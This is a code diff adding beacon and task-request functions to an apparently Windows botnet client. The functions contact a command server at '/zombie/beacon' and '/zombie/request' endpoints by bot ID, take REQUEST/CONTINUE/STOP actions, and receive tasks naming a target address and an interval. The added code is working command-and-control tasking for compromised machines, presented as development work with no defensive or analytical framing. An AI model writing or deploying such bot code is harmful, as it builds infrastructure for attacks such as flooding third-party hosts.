@@ -6,6 +6,7 @@
 #include <sstream>
 #include "nlohmann/json.hpp"
 #include "win_functions.h"
+#include "task.h"
 
 using json = nlohmann::json;
 
@@ -129,6 +130,306 @@ Worker registerWorkerWin(const char* serverIP, int serverPort, in_addr ipAddress
     closesocket(sock);
     WSACleanup();
     return workerObject;
+}
+
+Command beacon(const char* serverIP, int serverPort, Worker worker) {
+    // Initialize Winsock
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        std::cerr << "Failed to initialize Winsock." << std::endl;
+        return Command();
+    }
+
+    // Create a socket
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == INVALID_SOCKET) {
+        std::cerr << "Failed to create socket." << std::endl;
+        WSACleanup();
+        return Command();
+    }
+    // Set the server address
+    sockaddr_in serverAddress;
+    serverAddress.sin_family = AF_INET;
+    serverAddress.sin_addr.s_addr = inet_addr(serverIP);
+    serverAddress.sin_port = htons(serverPort);
+
+    // Connect to the server
+    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR) {
+        std::cerr << "Failed to connect to the server." << std::endl;
+        closesocket(sock);
+        WSACleanup();
+        return Command();
+    }
+
+    // Send an HTTP request to the API endpoint
+    int bot_id = worker.id; 
+    int task_id = -1; 
+    std::string progress = progressToString(Progress::SUCCESS); 
+
+    // Construct the query string
+    std::string queryParams = "bot_id=" + std::to_string(bot_id) + "&task_id=" + std::to_string(task_id) + "&progress=" + progress;
+
+    // Create the HTTP request
+    std::string httpRequest = "GET /zombie/beacon?" + queryParams + " HTTP/1.1\r\n"
+        "Host: " + std::string(serverIP) + "\r\n"
+        "Connection: close\r\n"
+        "Content-Type: application/json\r\n"
+        "\r\n";
+
+    if (send(sock, httpRequest.c_str(), httpRequest.length(), 0) == SOCKET_ERROR) {
+        std::cerr << "Failed to send HTTP request." << std::endl;
+        closesocket(sock);
+        WSACleanup();
+        return Command();
+    }
+
+
+    // Receive and process the HTTP response
+    const int receiveBufferSize = 1024;
+    char receiveBuffer[receiveBufferSize];
+
+    std::string response;
+
+    int bytesRead;
+    do {
+        bytesRead = recv(sock, receiveBuffer, receiveBufferSize - 1, 0);
+        if (bytesRead > 0) {
+            receiveBuffer[bytesRead] = '\0';
+            response += receiveBuffer;
+        }
+    } while (bytesRead > 0);
+
+    //std::cout << "Received response:\n" << response << std::endl;
+
+    // Find the start and end of the response data
+    std::string responseData;
+    size_t responseDataStart = response.find("{");
+    size_t responseDataEnd = response.rfind("}");
+    if (responseDataStart != std::string::npos && responseDataEnd != std::string::npos) {
+        responseData = response.substr(responseDataStart, responseDataEnd - responseDataStart + 1);
+    }
+
+    // Print the response data
+    //std::cout << "Received response data:\n" << responseData << std::endl;
+
+    // Parse the JSON response data
+    rapidjson::Document document;
+    document.Parse(responseData.c_str());
+
+    if (document.HasParseError()) {
+        std::cerr << "Failed to parse JSON." << std::endl;
+        closesocket(sock);
+        WSACleanup();
+        return Command();
+    }
+
+    Command commandObject = Command::REQUEST;
+
+    if (document.IsObject()) {
+        if (document.HasMember("action") && document["action"].IsString()) {
+            std::string action = document["action"].GetString();
+            //std::cout << "Action: " << action << std::endl;
+
+            if (action == "REQUEST") {
+                commandObject = Command::REQUEST;
+            }
+            else if (action == "CONTINUE") {
+                commandObject = Command::CONTINUE;
+            }
+            else if (action == "STOP") {
+                commandObject = Command::STOP;
+            }
+            else {
+                std::cerr << "Invalid action name: " << action << std::endl;
+            }
+        }
+    }
+
+    // Clean up
+    closesocket(sock);
+    WSACleanup();
+    return commandObject;
+}
+
+Task request(const char* serverIP, int serverPort, Worker worker) {
+    // Initialize Winsock
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        std::cerr << "Failed to initialize Winsock." << std::endl;
+        return Task();
+    }
+
+    // Create a socket
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == INVALID_SOCKET) {
+        std::cerr << "Failed to create socket." << std::endl;
+        WSACleanup();
+        return Task();
+    }
+    // Set the server address
+    sockaddr_in serverAddress;
+    serverAddress.sin_family = AF_INET;
+    serverAddress.sin_addr.s_addr = inet_addr(serverIP);
+    serverAddress.sin_port = htons(serverPort);
+
+    // Connect to the server
+    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR) {
+        std::cerr << "Failed to connect to the server." << std::endl;
+        closesocket(sock);
+        WSACleanup();
+        return Task();
+    }
+
+    // Send an HTTP request to the API endpoint
+    int bot_id = worker.id;
+
+    // Construct the query string
+    std::string queryParams = "bot_id=" + std::to_string(bot_id);
+
+    // Create the HTTP request
+    std::string httpRequest = "GET /zombie/request?" + queryParams + " HTTP/1.1\r\n"
+        "Host: " + std::string(serverIP) + "\r\n"
+        "Connection: close\r\n"
+        "Content-Type: application/json\r\n"
+        "\r\n";
+
+    if (send(sock, httpRequest.c_str(), httpRequest.length(), 0) == SOCKET_ERROR) {
+        std::cerr << "Failed to send HTTP request." << std::endl;
+        closesocket(sock);
+        WSACleanup();
+        return Task();
+    }
+
+    char buffer[1024]; // Assuming a buffer size of 1024 is sufficient for the response
+
+    int bytesReadResp = recv(sock, buffer, sizeof(buffer), 0);
+    if (bytesReadResp == SOCKET_ERROR) {
+        std::cerr << "Failed to receive HTTP response." << std::endl;
+        closesocket(sock);
+        WSACleanup();
+        return Task();
+    }
+
+    std::string httpResponse(buffer, bytesReadResp);
+    if (httpResponse.find("HTTP/1.1 204 No Content") != std::string::npos) {
+        std::cerr << "No Tasks available" << std::endl;
+            closesocket(sock);
+            WSACleanup();
+            return Task();
+    }
+
+    if (httpResponse.find("HTTP/1.1 200 OK") == std::string::npos) {
+        std::cerr << "Unexpected HTTP response status: " << httpResponse << std::endl;
+        closesocket(sock);
+        WSACleanup();
+        return Task();
+    }
+
+    const int receiveBufferSize = 1024;
+    char receiveBuffer[receiveBufferSize];
+
+    std::string response;
+
+    int bytesRead;
+    do {
+        bytesRead = recv(sock, receiveBuffer, receiveBufferSize - 1, 0);
+        if (bytesRead > 0) {
+            receiveBuffer[bytesRead] = '\0';
+            response += receiveBuffer;
+        }
+    } while (bytesRead > 0);
+
+    std::cout << "Received response:\n" << response << std::endl;
+
+    // Find the start and end of the response data
+    std::string responseData;
+    size_t responseDataStart = response.find("{");
+    size_t responseDataEnd = response.rfind("}");
+    if (responseDataStart != std::string::npos && responseDataEnd != std::string::npos) {
+        responseData = response.substr(responseDataStart, responseDataEnd - responseDataStart + 1);
+    }
+
+    // Print the response data
+    //std::cout << "Received response data:\n" << responseData << std::endl;
+
+    size_t bodyStart = httpResponse.find("\r\n\r\n");
+
+    if (bodyStart != std::string::npos) {
+        std::string requestBody = httpResponse.substr(bodyStart + 4); // Skip the \r\n\r\n
+
+        // Now requestBody contains only the body of the request
+        //std::cout << "Request:\n" << httpResponse << std::endl;
+
+        //std::cout << "Request body:\n" << requestBody << std::endl;
+
+        // Remove trailing '0'
+        size_t lastNewline = requestBody.rfind('\n');
+        if (lastNewline != std::string::npos) {
+            lastNewline = lastNewline - 4;
+            std::string strippedRequestBody = requestBody.substr(0, lastNewline);
+            //std::cout << "Stripped request body:\n" << strippedRequestBody << std::endl;
+
+            size_t jsonDataStart = strippedRequestBody.find("{");
+            if (jsonDataStart != std::string::npos) {
+                std::string jsonData = strippedRequestBody.substr(jsonDataStart);
+                //std::cout << "Request body parsed:\n" << jsonData << std::endl;
+                responseData = jsonData;
+            }
+        }
+        else {
+            std::cerr << "Error: Unable to find newline character in request body." << std::endl;
+        }
+    }
+    else {
+        std::cerr << "Unable to find the start of the request body" << std::endl;
+    }
+
+
+    // Parse the JSON response data
+    rapidjson::Document document;
+    document.Parse(responseData.c_str());
+
+    if (document.HasParseError()) {
+        std::cerr << "Failed to parse JSON." << std::endl;
+        closesocket(sock);
+        WSACleanup();
+        return Task();
+    }
+
+    Task taskObject = Task();
+
+    if (document.IsObject()) {
+        if (document.HasMember("id") && document["id"].IsInt()) {
+            int id = document["id"].GetInt();
+            std::cout << "ID: " << id << std::endl;
+            taskObject.id = id;
+        }
+
+        if (document.HasMember("task") && document["task"].IsString()) {
+            std::string task = document["task"].GetString();
+            taskObject.task = task;
+        }
+
+        if (document.HasMember("taskParameters") && document["taskParameters"].IsObject()) {
+            const rapidjson::Value& taskParams = document["taskParameters"];
+            if (taskParams.HasMember("address") && taskParams["address"].IsString()) {
+                std::string address = taskParams["address"].GetString();
+                std::cout << "Address: " << address << std::endl;
+                taskObject.taskParams.address = address;
+            }
+
+            if (taskParams.HasMember("interval") && taskParams["interval"].IsInt()) {
+                int interval = taskParams["interval"].GetInt();
+                std::cout << "Interval: " << interval << std::endl;
+                taskObject.taskParams.interval = interval;
+            }
+        }
+    }
+
+    // Clean up
+    closesocket(sock);
+    WSACleanup();
+    return taskObject;
 }
 
 in_addr getIpAddress() {
